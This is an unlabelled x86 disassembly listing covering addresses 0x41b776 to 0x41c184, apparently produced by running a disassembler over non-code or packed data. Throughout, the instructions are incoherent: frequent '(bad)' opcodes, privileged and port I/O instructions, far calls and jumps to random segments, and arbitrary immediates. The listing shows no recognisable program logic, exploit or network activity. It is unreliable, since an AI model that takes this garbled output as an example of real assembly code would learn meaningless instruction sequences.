  41b776:	int3   
  41b777:	xor    al,0x1a
  41b779:	cmp    esp,ecx
  41b77b:	push   0x89523864
  41b780:	lea    edi,[edx]
  41b782:	push   edi
  41b783:	dec    edx
  41b784:	and    DWORD PTR [ebx+0x131e03d],0xffffffae
  41b78b:	add    edx,DWORD PTR ds:0xd282fce9
  41b791:	push   eax
  41b792:	sbb    eax,0xa08f0e0a
  41b797:	push   0x0
  41b799:	shr    esi,cl
  41b79b:	mov    ebp,0x58baf370
  41b7a0:	mov    esp,0x96487c9a
  41b7a5:	aam    0x2b
  41b7a7:	jge    0x41b7db
  41b7a9:	shl    ah,1
  41b7ab:	cld    
  41b7ac:	scas   al,BYTE PTR es:[edi]
  41b7ad:	lds    ebx,FWORD PTR [ebp+0x2e]
  41b7b0:	dec    edx
  41b7b1:	int3   
  41b7b2:	mov    al,0x35
  41b7b4:	scas   al,BYTE PTR es:[edi]
  41b7b5:	jl     0x41b803
  41b7b7:	outs   dx,DWORD PTR ds:[esi]
  41b7b8:	test   eax,0x2198c43b
  41b7bd:	pop    esp
  41b7be:	cmp    al,0xd2
  41b7c0:	xor    eax,0xbf88be71
  41b7c5:	xor    al,0x59
  41b7c7:	int3   
  41b7c8:	daa    
  41b7c9:	push   cs
  41b7ca:	out    0xa8,eax
  41b7cc:	sahf   
  41b7cd:	xor    BYTE PTR [edi-0x3cbec2ae],al
  41b7d3:	movsx  ebx,BYTE PTR [eax+0x3c99cb80]
  41b7da:	loopne 0x41b841
  41b7dc:	imul   al
  41b7de:	mov    al,ds:0x29cb0284
  41b7e3:	ret    0xfc84
  41b7e6:	jne    0x41b853
  41b7e8:	ins    BYTE PTR es:[edi],dx
  41b7e9:	stos   DWORD PTR es:[edi],eax
  41b7ea:	dec    edx
  41b7eb:	or     edx,DWORD PTR [eax+0x772af761]
  41b7f1:	inc    ebx
  41b7f2:	inc    esp
  41b7f3:	retf   
  41b7f4:	sar    DWORD PTR [ecx-0x23],cl
  41b7f7:	sbb    ecx,ebp
  41b7f9:	dec    ebp
  41b7fa:	mov    ch,0x9e
  41b7fc:	(bad)  
  41b7fd:	sbb    ebp,DWORD PTR [edi+edi*1-0x77dd91d3]
  41b804:	sbb    dh,BYTE PTR ds:0x79c8585e
  41b80a:	imul   eax,eax,0x32270b89
	...
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xac
  41b881:	loop   0x41b902
  41b883:	and    BYTE PTR [si],ah
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    al,0x1
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	(bad)  
  41b88e:	loope  0x41b8e1
  41b890:	cmp    ch,BYTE PTR [edx-0x2d]
  41b893:	popw   es
  41b895:	jns    0x41b820
  41b897:	and    BYTE PTR [edi+edi*4],bl
  41b89a:	es mov dh,0x6c
  41b89d:	add    al,0xe6
  41b89f:	aaa    
  41b8a0:	sti    
  41b8a1:	dec    ecx
  41b8a2:	sub    esp,eax
  41b8a4:	int    0x29
  41b8a6:	cmp    eax,0x55b7caf9
  41b8ab:	imul   edx,DWORD PTR [edx-0x31],0xeb7f41c9
  41b8b2:	push   ebx
  41b8b3:	retf   
  41b8b4:	xlat   BYTE PTR ds:[ebx]
  41b8b5:	add    DWORD PTR [esi+0x10],eax
  41b8b8:	clc    
  41b8b9:	cmp    eax,0x31056b72
  41b8be:	icebp  
  41b8bf:	xor    ch,BYTE PTR [esi+0x15d5c6a7]
  41b8c5:	les    esi,FWORD PTR [esi+0x4e]
  41b8c8:	aad    0x5b
  41b8ca:	in     eax,0x47
  41b8cc:	and    BYTE PTR [ecx-0x72939528],ch
  41b8d2:	jbe    0x41b90c
  41b8d4:	push   esi
  41b8d5:	xchg   edx,eax
  41b8d6:	dec    esi
  41b8d7:	or     eax,0xa7067e4
  41b8dc:	add    BYTE PTR [eax+ebx*8],ch
  41b8df:	mov    edi,0xe1dce345
  41b8e4:	sub    BYTE PTR [esi+0x3a78e772],bh
  41b8ea:	push   ebx
  41b8eb:	les    eax,FWORD PTR ds:0x1a5e2fe4
  41b8f1:	cs adc al,0x8d
  41b8f4:	sbb    ebp,ecx
  41b8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f7:	mov    eax,ds:0x6080a4de
  41b8fc:	sahf   
  41b8fd:	fistp  QWORD PTR [ebp+0x4b]
  41b900:	lahf   
  41b901:	and    DWORD PTR [edx+0x28],esi
  41b904:	dec    edx
  41b905:	test   eax,0xe03f0296
  41b90a:	dec    esi
  41b90b:	mov    ebx,0x4721d83b
  41b910:	add    al,0x98
  41b912:	call   0x2f16:0x38aefd17
  41b919:	das    
  41b91a:	sub    al,0x59
  41b91c:	jg     0x41b918
  41b91e:	pop    eax
  41b91f:	fsub   DWORD PTR [esi-0x5374109a]
  41b925:	int3   
  41b926:	mov    ebx,?
  41b928:	out    dx,al
  41b929:	bound  edi,QWORD PTR [ecx]
  41b92b:	pop    eax
  41b92c:	add    al,0xa
  41b92e:	jns    0x41b934
  41b930:	xor    dl,ah
  41b932:	in     eax,dx
  41b933:	scas   al,BYTE PTR es:[edi]
  41b934:	lea    edi,[eax]
  41b936:	pushf  
  41b937:	sub    ebx,DWORD PTR [ebp-0x64dbae80]
  41b93d:	or     al,ch
  41b93f:	sub    dh,BYTE PTR [ecx+0x616c826]
  41b945:	mov    ecx,0x1cfeab0f
  41b94a:	aad    0xc0
  41b94c:	adc    edi,ebp
  41b94e:	fadd   DWORD PTR [eax+0x2f8694c0]
  41b954:	fs sub bh,dl
  41b957:	daa    
  41b958:	fnstsw WORD PTR [edx]
  41b95a:	adc    eax,0xa80ac9a
  41b95f:	std    
  41b960:	sbb    al,0xa3
  41b962:	pop    ss
  41b963:	sti    
  41b964:	mov    ds:0xbd423aca,al
  41b969:	and    bl,al
  41b96b:	scas   eax,DWORD PTR es:[edi]
  41b96c:	inc    esp
  41b96d:	mov    ch,0x7d
  41b96f:	lds    ebp,FWORD PTR ds:0x3c581118
  41b975:	push   eax
  41b976:	aas    
  41b977:	stos   BYTE PTR es:[edi],al
  41b978:	xchg   ecx,eax
  41b979:	call   0x9295c4ce
  41b97e:	dec    ebx
  41b97f:	loope  0x41b906
  41b981:	pushf  
  41b982:	icebp  
  41b983:	stos   BYTE PTR es:[edi],al
  41b984:	inc    eax
  41b985:	ins    BYTE PTR es:[edi],dx
  41b986:	loop   0x41b947
  41b988:	mov    ebp,0x892a0586
  41b98d:	xor    esp,DWORD PTR [ebp+esi*1+0x0]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	in     al,0x8b
  41ba02:	and    al,0xa6
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	dec    edi
  41ba0d:	cwde   
  41ba0e:	jmp    0x41b9ea
  41ba10:	ret    0x6f88
  41ba13:	nop
  41ba14:	inc    edi
  41ba15:	lds    edi,FWORD PTR [eax+0x2eedf964]
  41ba1b:	loopne 0x41ba98
  41ba1d:	jmp    0xbb8c:0x3eccf472
  41ba24:	cmp    DWORD PTR [eax+0x574c859a],0xffffff80
  41ba2b:	call   0xa0503538
  41ba30:	fwait
  41ba31:	mov    ch,0x23
  41ba33:	lods   eax,DWORD PTR ds:[esi]
  41ba34:	cld    
  41ba35:	inc    edx
  41ba36:	sub    BYTE PTR [ecx-0x17ca2bad],al
  41ba3c:	fild   QWORD PTR [esp+ecx*4]
  41ba3f:	(bad)  
  41ba40:	out    0x91,eax
  41ba42:	cmp    ebx,DWORD PTR [eax+esi*4+0x7b]
  41ba46:	xchg   BYTE PTR [ebx],dl
  41ba48:	mov    esp,0x39bc7e1b
  41ba4d:	sub    ch,bh
  41ba4f:	mov    dl,0xa5
  41ba51:	jle    0x41b9fd
  41ba53:	xchg   edi,eax
  41ba54:	(bad)  
  41ba55:	mov    eax,DWORD PTR [eax+0xba72de1]
  41ba5b:	stos   DWORD PTR es:[edi],eax
  41ba5c:	pop    edx
  41ba5d:	mov    eax,ds:0xdb07e1a6
  41ba62:	xor    esi,edx
  41ba64:	add    ebx,DWORD PTR [esi+0x6f]
  41ba67:	dec    esp
  41ba68:	inc    edi
  41ba69:	or     esp,edx
  41ba6b:	pop    eax
  41ba6c:	shl    BYTE PTR [esi-0x260c6cdb],cl
  41ba72:	ins    DWORD PTR es:[edi],dx
  41ba73:	mov    ebx,0x69616e97
  41ba78:	mov    es,WORD PTR [ebx]
  41ba7a:	dec    ebx
  41ba7b:	add    BYTE PTR [ebx-0x4162cdea],0x20
  41ba82:	pop    ebx
  41ba83:	out    dx,al
  41ba84:	mov    ds:0xb437f7e6,al
  41ba89:	pop    esi
  41ba8a:	cmc    
  41ba8b:	int3   
  41ba8c:	sbb    edi,DWORD PTR [esi+0x77b91329]
  41ba92:	dec    edx
  41ba93:	inc    ebp
  41ba94:	fdiv   DWORD PTR [eax+0x62]
  41ba97:	xor    al,0x63
  41ba99:	and    BYTE PTR [ebp+eax*2+0xe],bl
  41ba9d:	dec    ecx
  41ba9e:	fidivr WORD PTR [ebx]
  41baa0:	add    dh,BYTE PTR [ecx+edx*4]
  41baa3:	sub    BYTE PTR [edx+0x6d9d76fc],ch
  41baa9:	loope  0x41ba32
  41baab:	test   DWORD PTR [eax-0x37],0x39882848
  41bab2:	jp     0x41bb07
  41bab4:	imul   BYTE PTR [ecx+0x2d944bf8]
  41baba:	pop    es
  41babb:	ror    DWORD PTR [ebx],cl
  41babd:	cmp    al,0xae
  41babf:	xor    al,0x81
  41bac1:	push   ebp
  41bac2:	test   BYTE PTR [edx],cl
  41bac4:	in     al,dx
  41bac5:	mov    dl,0x77
  41bac7:	aad    0x5
  41bac9:	aam    0x5
  41bacb:	mov    ds:0x42b2f1a,eax
  41bad0:	rcl    eax,0xe1
  41bad3:	sub    BYTE PTR [eax],dh
  41bad5:	sbb    DWORD PTR [ebx],eax
  41bad7:	jp     0x41ba9a
  41bad9:	test   eax,0xec84e094
  41bade:	jne    0x41bb15
  41bae0:	pop    ss
  41bae1:	inc    esi
  41bae2:	fstp   TBYTE PTR [eax+0x37]
  41bae5:	mov    edi,DWORD PTR [ebp-0x49d41c84]
  41baeb:	inc    edi
  41baec:	mov    WORD PTR [ebp-0x4f3a243d],?
  41baf2:	adc    edx,DWORD PTR [ecx]
  41baf4:	jno    0x41ba93
  41baf6:	push   0xca26d532
  41bafb:	or     bh,BYTE PTR [esi+0x73]
  41bafe:	fistp  WORD PTR [ebx]
  41bb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb01:	jmp    0xcfdd1506
  41bb06:	add    eax,0xffee37f9
  41bb0b:	sar    DWORD PTR [ecx-0x1],1
  41bb0e:	mov    dh,0x9
	...
  41bb74:	or     bh,BYTE PTR [eax-0x4048555b]
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x3d],cx
  41bb81:	bound  eax,QWORD PTR [ebx+0x126281d]
  41bb87:	add    BYTE PTR [ecx+eax*1],al
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	test   BYTE PTR [edi],ch
  41bb8e:	or     eax,0xa3ad0b39
  41bb93:	inc    ebp
  41bb94:	sti    
  41bb95:	cwde   
  41bb96:	pop    ds
  41bb97:	pop    ebp
  41bb98:	mov    eax,ds:0x3adf6967
  41bb9d:	sbb    esi,esp
  41bb9f:	leave  
  41bba0:	es sbb bl,dl
  41bba3:	sbb    cl,BYTE PTR [ebx-0x7f5a6b37]
  41bba9:	mov    ah,bl
  41bbab:	mov    esi,0x41c3d705
  41bbb0:	push   ebx
  41bbb1:	dec    edx
  41bbb2:	shr    BYTE PTR [esi+eax*8],0x10
  41bbb6:	fimul  DWORD PTR [edi+0xbd47ea9]
  41bbbc:	push   ds
  41bbbd:	mov    bh,0x36
  41bbbf:	in     eax,0x48
  41bbc1:	es fsubp st(2),st
  41bbc4:	out    dx,al
  41bbc5:	xchg   edi,eax
  41bbc6:	icebp  
  41bbc7:	jge    0x41bbca
  41bbc9:	jle    0x41bbf0
  41bbcb:	or     DWORD PTR [ebp-0x1a],ecx
  41bbce:	adc    DWORD PTR [esi-0x9],0xb65c081e
  41bbd5:	pop    DWORD PTR [ecx-0x48]
  41bbd8:	in     al,0x8f
  41bbda:	mov    al,0x6a
  41bbdc:	vmaxsd xmm4,xmm7,xmm5
  41bbe0:	into   
  41bbe1:	jno    0x41bb76
  41bbe3:	adc    esp,ebp
  41bbe5:	pop    es
  41bbe6:	sbb    eax,0xcd6cb2a7
  41bbeb:	mov    bh,0xa3
  41bbed:	pop    edx
  41bbee:	out    0x5,al
  41bbf0:	inc    ebp
  41bbf1:	xchg   ebp,esp
  41bbf3:	push   edx
  41bbf4:	je     0x41bc36
  41bbf6:	mov    al,ds:0xce4ce117
  41bbfb:	imul   ebx,DWORD PTR [edi-0x32],0x57
  41bbff:	mov    dl,BYTE PTR [eax+ebx*1+0x7005c3a1]
  41bc06:	xchg   ebx,eax
  41bc07:	dec    ecx
  41bc08:	popf   
  41bc09:	push   cs
  41bc0a:	push   0x2157f883
  41bc0f:	ss daa 
  41bc11:	retf   
  41bc12:	je     0x41bb95
  41bc14:	mov    bh,ah
  41bc16:	xchg   ebp,eax
  41bc17:	jmp    0x8b35:0x1ca7af66
  41bc1e:	adc    BYTE PTR es:[edi+edx*1-0x59c6f9ee],ch
  41bc26:	jmp    0xe09a2
  41bc2b:	popf   
  41bc2c:	call   0x8db8:0xfce37c60
  41bc33:	cmc    
  41bc34:	cmp    eax,0x5eaf635e
  41bc39:	pop    edi
  41bc3a:	add    eax,0x1955a6dd
  41bc3f:	inc    ebx
  41bc40:	test   dh,ch
  41bc42:	xchg   esi,eax
  41bc43:	xlat   BYTE PTR ds:[ebx]
  41bc44:	xchg   ecx,eax
  41bc45:	fdivr  st,st(5)
  41bc47:	push   esi
  41bc48:	push   ds
  41bc49:	inc    edx
  41bc4a:	jbe    0x41bc0e
  41bc4c:	or     esp,0x6e
  41bc4f:	and    bl,bl
  41bc51:	or     eax,0x4bf89fb4
  41bc56:	pop    edx
  41bc57:	pop    esi
  41bc58:	shr    DWORD PTR [ebp-0x53],0xd6
  41bc5c:	js     0x41bc48
  41bc5e:	rcr    al,cl
  41bc60:	out    dx,al
  41bc61:	pop    ebx
  41bc62:	test   al,0xde
  41bc64:	add    al,0xdf
  41bc66:	aas    
  41bc67:	wrmsr  
  41bc69:	fcom   DWORD PTR [ecx]
  41bc6b:	jmp    0xe734671e
  41bc70:	xchg   ecx,eax
  41bc71:	and    ah,bh
  41bc73:	sbb    bh,ah
  41bc75:	jno    0x41bcdd
  41bc77:	cmp    ebp,0x25a4dc11
  41bc7d:	cmp    ecx,DWORD PTR [edi+0x69]
  41bc80:	add    al,BYTE PTR [edx+edx*2+0x17606900]
  41bc87:	or     DWORD PTR gs:[edi+0x70],ebp
  41bc8b:	inc    edi
  41bc8c:	xchg   ebp,eax
  41bc8d:	imul   edi,ebx,0xa
	...
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x226d9d8
  41bd02:	shl    DWORD PTR [esp+ebp*1+0x27],cl
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	jp     0x41bce3
  41bd0e:	or     DWORD PTR [edx-0x24cf9c4d],ebx
  41bd14:	xchg   ecx,eax
  41bd15:	push   es
  41bd16:	imul   BYTE PTR [ebp-0xe]
  41bd19:	xor    dh,ch
  41bd1b:	add    al,0xd0
  41bd1d:	adc    eax,0x8714bc41
  41bd22:	mul    DWORD PTR [eax+eax*2+0x2c]
  41bd26:	push   esp
  41bd27:	fcmovnu st,st(2)
  41bd29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2a:	jle    0x41bcda
  41bd2c:	popa   
  41bd2d:	retf   
  41bd2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2f:	repz enter 0xc393,0x22
  41bd34:	mov    WORD PTR [ebx+0x6b1640b9],?
  41bd3a:	ja     0x41bd81
  41bd3c:	neg    al
  41bd3e:	loop   0x41bd77
  41bd40:	jb     0x41bd4d
  41bd42:	test   al,0x6c
  41bd44:	ds jecxz 0x41bd6c
  41bd47:	int    0x1f
  41bd49:	dec    ebp
  41bd4a:	call   0x19b2c591
  41bd4f:	scas   eax,DWORD PTR es:[edi]
  41bd50:	push   esp
  41bd51:	in     al,dx
  41bd52:	sbb    eax,0x6df714b
  41bd57:	push   edx
  41bd58:	or     eax,0x1ed323fc
  41bd5d:	jnp    0x41bcf5
  41bd5f:	jae    0x41bdb7
  41bd61:	cs mov cl,0xe1
  41bd64:	std    
  41bd65:	push   0xb9c66d8b
  41bd6a:	push   esi
  41bd6b:	jecxz  0x41bd2a
  41bd6d:	data16 cmc 
  41bd6f:	mov    ds:0x1d06bde9,eax
  41bd74:	jecxz  0x41bd9c
  41bd76:	xor    al,0xf2
  41bd78:	fcom   st(1)
  41bd7a:	xchg   edx,eax
  41bd7b:	aaa    
  41bd7c:	mov    esp,0xa41c4495
  41bd81:	jae    0x41bd39
  41bd83:	fcmovb st,st(4)
  41bd85:	push   ss
  41bd86:	leave  
  41bd87:	sbb    DWORD PTR [esi],0xffffffdb
  41bd8a:	push   cs
  41bd8b:	xor    al,0xc1
  41bd8d:	(bad)  
  41bd8e:	repz sub DWORD PTR [ecx-0x3be4a681],esp
  41bd95:	frstor [esi+0xb6b9a29]
  41bd9b:	cmp    ah,BYTE PTR [esi]
  41bd9d:	hlt    
  41bd9e:	jg     0x41bd86
  41bda0:	fmul   QWORD PTR [edi+esi*2-0xacf896e]
  41bda7:	test   al,0x3
  41bda9:	or     eax,0x9bb41faa
  41bdae:	int3   
  41bdaf:	push   ecx
  41bdb0:	mov    esi,0x4a02bb1e
  41bdb5:	fild   DWORD PTR [esi+edi*1-0x49]
  41bdb9:	pop    edx
  41bdba:	int    0x8e
  41bdbc:	pop    ecx
  41bdbd:	add    bh,dh
  41bdbf:	jno    0x41bda5
  41bdc1:	fnstsw WORD PTR [esi+0x20]
  41bdc4:	outs   dx,DWORD PTR ds:[esi]
  41bdc5:	push   eax
  41bdc6:	(bad)  
  41bdc7:	in     eax,0xdd
  41bdc9:	or     eax,ebp
  41bdcb:	cmp    eax,0x33dab9f2
  41bdd0:	test   al,0x92
  41bdd2:	ja     0x41bd85
  41bdd4:	push   edi
  41bdd5:	push   eax
  41bdd6:	pushf  
  41bdd7:	loope  0x41be48
  41bdd9:	sub    esp,edx
  41bddb:	adc    ah,BYTE PTR [ecx-0x4f9dc4e2]
  41bde1:	push   cs
  41bde2:	jb     0x41bd87
  41bde4:	daa    
  41bde5:	icebp  
  41bde6:	ja     0x41bdae
  41bde8:	cmp    edx,esp
  41bdea:	and    DWORD PTR ds:0xf63e976f,eax
  41bdf0:	xchg   esi,eax
  41bdf1:	(bad)  
  41bdf2:	ret    
  41bdf3:	scas   al,BYTE PTR es:[edi]
  41bdf4:	nop
  41bdf5:	fimul  WORD PTR [ecx+edx*8+0x3d]
  41bdf9:	int    0x82
  41bdfb:	jbe    0x41bdb1
  41bdfd:	lods   eax,DWORD PTR ds:[esi]
  41bdfe:	or     DWORD PTR [ecx],edi
  41be00:	rcr    BYTE PTR [ebp+ebp*1+0x49],1
  41be04:	inc    ebp
  41be05:	mov    dh,0x6d
  41be07:	pusha  
  41be08:	push   edi
  41be09:	add    BYTE PTR [esi],bh
  41be0b:	loop   0x41bdf1
  41be0d:	sub    BYTE PTR [edi+0x6e],bl
	...
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x48b2c09a]
  41be82:	add    esi,DWORD PTR [ecx+0x30]
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR [ecx+eax*1],al
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	sbb    DWORD PTR [ecx],ecx
  41be8e:	mov    WORD PTR [eax],fs
  41be90:	ds ins BYTE PTR es:[edi],dx
  41be92:	retf   
  41be93:	(bad)  
  41be94:	(bad)  
  41be95:	inc    BYTE PTR [edx]
  41be97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be98:	jo     0x41bf02
  41be9a:	inc    ecx
  41be9b:	xchg   ecx,ecx
  41be9d:	je     0x41bebc
  41be9f:	fwait
  41bea0:	push   ss
  41bea1:	stos   BYTE PTR es:[edi],al
  41bea2:	push   0xffffffcf
  41bea4:	mov    ah,0xd6
  41bea6:	cmp    al,0xd
  41bea8:	aas    
  41bea9:	or     DWORD PTR [esi],esp
  41beab:	and    edx,DWORD PTR [esi+ebp*8+0x765b3344]
  41beb2:	lock sbb ebx,DWORD PTR [edi+eiz*4]
  41beb6:	clc    
  41beb7:	mov    ds:0x151e5732,eax
  41bebc:	ins    BYTE PTR es:[edi],dx
  41bebd:	cs xchg edi,eax
  41bebf:	or     esi,ebx
  41bec1:	int    0x53
  41bec3:	xor    ecx,DWORD PTR [edx+0x67]
  41bec6:	das    
  41bec7:	in     al,0x71
  41bec9:	in     al,dx
  41beca:	sub    al,0x4c
  41becc:	add    eax,0x61d36bb3
  41bed1:	dec    ebx
  41bed2:	dec    ecx
  41bed3:	xchg   esp,eax
  41bed4:	add    al,0x90
  41bed7:	xchg   edi,eax
  41bed8:	ror    BYTE PTR [eax],1
  41beda:	imul   ebx,edi,0x8
  41bedd:	jo     0x41bf16
  41bedf:	fwait
  41bee0:	jne    0x41be7d
  41bee2:	push   edx
  41bee3:	out    dx,eax
  41bee4:	js     0x41bf43
  41bee6:	pop    es
  41bee7:	call   0xa6d5:0x8b20d41
  41beee:	push   0x5ba37552
  41bef3:	stos   BYTE PTR es:[edi],al
  41bef4:	xor    ch,bl
  41bef6:	pop    ebx
  41bef7:	jo     0x41bed6
  41bef9:	outs   dx,BYTE PTR ds:[esi]
  41befa:	pop    ecx
  41befb:	in     eax,0x0
  41befd:	dec    esp
  41befe:	and    edx,DWORD PTR [ebx]
  41bf00:	jp     0x41beca
  41bf02:	ins    BYTE PTR es:[edi],dx
  41bf03:	fadd   QWORD PTR [edx]
  41bf05:	adc    bl,al
  41bf07:	and    BYTE PTR [edi+0x65],al
  41bf0a:	pop    es
  41bf0b:	imul   ebx,ebx,0x83b6636d
  41bf11:	pushf  
  41bf12:	call   0xf869:0x581774ea
  41bf19:	sbb    esi,DWORD PTR [eax+0x49]
  41bf1c:	aaa    
  41bf1d:	cmp    eax,0x31cf98a6
  41bf22:	js     0x41bf55
  41bf24:	xchg   esp,eax
  41bf25:	sbb    eax,0x77a68f21
  41bf2a:	pop    ds
  41bf2b:	jnp    0x41bf63
  41bf2d:	xlat   BYTE PTR ds:[ebx]
  41bf2e:	pop    edx
  41bf2f:	cmp    al,0x9c
  41bf31:	mov    ebp,cs
  41bf33:	cli    
  41bf34:	scas   eax,DWORD PTR es:[edi]
  41bf35:	cmp    eax,DWORD PTR [ebx+0x4]
  41bf38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf39:	mov    eax,ds:0x118e706
  41bf3e:	shl    DWORD PTR [ebx],0x27
  41bf41:	xchg   esp,eax
  41bf42:	and    ebx,DWORD PTR [esp+edi*8-0x37]
  41bf46:	jg     0x41bf74
  41bf48:	imul   ecx,edi,0x2731d8e5
  41bf4e:	mov    eax,ds:0x39e3edd5
  41bf53:	movzx  ebx,WORD PTR [edi+0x18]
  41bf57:	mov    al,0xa2
  41bf59:	sti    
  41bf5a:	(bad)  
  41bf5c:	dec    edx
  41bf5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf5e:	jne    0x41bf83
  41bf60:	push   ds
  41bf61:	cmp    esi,DWORD PTR [ecx+0x42f7f354]
  41bf67:	jmp    0x15bb9cf0
  41bf6c:	dec    edi
  41bf6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6e:	mov    WORD PTR es:[ecx],es
  41bf71:	xor    eax,0x104174af
  41bf76:	dec    ebp
  41bf77:	cld    
  41bf78:	ffreep st(6)
  41bf7a:	mov    edx,0x86966712
  41bf7f:	or     al,0x4
  41bf81:	aaa    
  41bf82:	xor    DWORD PTR [esi+0x4c],0x1d
  41bf86:	inc    edx
  41bf87:	rcr    BYTE PTR [ebp+eax*8+0x5dc42ca5],cl
  41bf8e:	xor    DWORD PTR ds:0x0,edi
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	mov    ds:0x34746e99,eax
  41c005:	sub    DWORD PTR [ecx],eax
  41c007:	add    BYTE PTR [ecx+eax*1],al
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	cdq    
  41c00d:	mov    ch,0x5f
  41c00f:	aas    
  41c010:	xchg   ecx,eax
  41c011:	test   eax,0xc8ed936e
  41c016:	xor    al,dl
  41c018:	test   eax,0xf306fac8
  41c01d:	or     DWORD PTR [edi+0x59df0866],0x1d942a84
  41c027:	jnp    0x41bfbb
  41c029:	jbe    0x41bffd
  41c02b:	jnp    0xf62e46cd
  41c031:	pop    ebx
  41c032:	ret    0x5fe7
  41c035:	into   
  41c036:	loop   0x41bfd7
  41c038:	dec    esp
  41c039:	push   eax
  41c03a:	or     al,0x66
  41c03c:	ror    DWORD PTR [eax-0x32],cl
  41c03f:	jno    0x41bfd2
  41c041:	pop    edi
  41c042:	xor    eax,0xe7bca59e
  41c047:	bound  esp,QWORD PTR [edx]
  41c049:	inc    esi
  41c04a:	jp     0x41c071
  41c04c:	xor    DWORD PTR [edx+0x75],eax
  41c04f:	mov    ch,0xf4
  41c051:	pushf  
  41c052:	pushf  
  41c053:	cmp    al,0x4c
  41c055:	mov    dl,0x6e
  41c057:	aas    
  41c058:	mov    dl,0xf3
  41c05a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41c05c:	ficomp DWORD PTR [ebx]
  41c05e:	mov    DWORD PTR [ebx-0x1a],esp
  41c061:	pop    esp
  41c062:	pushf  
  41c063:	js     0x41c025
  41c065:	mov    eax,ds:0xff059fe8
  41c06a:	ss addr16 sbb ebp,esi
  41c06e:	ins    DWORD PTR es:[edi],dx
  41c06f:	push   edi
  41c070:	push   edi
  41c071:	data16 jnp 0x41bff5
  41c074:	mov    DWORD PTR [ebp+0x593c6c88],ebp
  41c07a:	adc    BYTE PTR [ebp+0x5f],dl
  41c07d:	sbb    ebp,DWORD PTR [edi]
  41c07f:	mov    cl,0x6b
  41c081:	cld    
  41c082:	or     eax,0x9e98592c
  41c087:	add    bl,dh
  41c089:	jmp    0xfeb0:0x448707dd
  41c090:	ins    BYTE PTR es:[edi],dx
  41c091:	sar    DWORD PTR [ebx+ebx*1-0x78],0xba
  41c096:	rcr    ecx,1
  41c098:	rol    DWORD PTR [eax],1
  41c09a:	xor    esi,eax
  41c09c:	inc    ebp
  41c09d:	sub    BYTE PTR [edi-0x3cc519fd],0xbe
  41c0a4:	add    ch,BYTE PTR [esi+0x8032020]
  41c0aa:	retf   
  41c0ab:	cwde   
  41c0ac:	addr16 sbb eax,0x471ffea8
  41c0b2:	lods   eax,DWORD PTR ds:[esi]
  41c0b3:	stos   DWORD PTR es:[edi],eax
  41c0b4:	lahf   
  41c0b5:	ins    BYTE PTR es:[edi],dx
  41c0b6:	(bad)  
  41c0b7:	sar    BYTE PTR [edi-0x690aecb],cl
  41c0bd:	shl    BYTE PTR [eax-0x53],cl
  41c0c0:	dec    ecx
  41c0c1:	repz push edx
  41c0c3:	add    DWORD PTR [ebp-0x26],ebx
  41c0c6:	outs   dx,DWORD PTR ds:[esi]
  41c0c7:	ds ror edi,0x47
  41c0cb:	popf   
  41c0cc:	xchg   ebx,eax
  41c0cd:	pop    ebp
  41c0ce:	push   esi
  41c0cf:	repz jbe 0x41c0bd
  41c0d2:	in     eax,0x5e
  41c0d4:	xchg   DWORD PTR [ebx-0xa53fae9],esi
  41c0da:	add    eax,0x527a1196
  41c0df:	inc    esp
  41c0e0:	sahf   
  41c0e1:	retf   0x3dac
  41c0e4:	ins    BYTE PTR es:[edi],dx
  41c0e5:	xor    esp,edi
  41c0e7:	or     BYTE PTR [ebx*8+0x2f0f77b9],0x1c
  41c0ef:	jg     0x41c134
  41c0f1:	test   bh,al
  41c0f3:	adc    DWORD PTR [eax+0x7f9de27],0xffffffbd
  41c0fa:	jecxz  0x41c0a7
  41c0fc:	xchg   si,ax
  41c0fe:	dec    esi
  41c0ff:	push   esi
  41c100:	repz mov ah,0xbb
  41c103:	mov    dl,0xf2
  41c105:	(bad)  
  41c106:	(bad)  
  41c107:	mov    al,dl
  41c109:	(bad)  
  41c10a:	inc    edx
  41c10b:	imul   DWORD PTR [eax+0x17d95d]
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0xf7e90501,0xffffffaa
  41c182:	sbb    al,0xdf
  41c184:	cmp    BYTE PTR [edx],ch
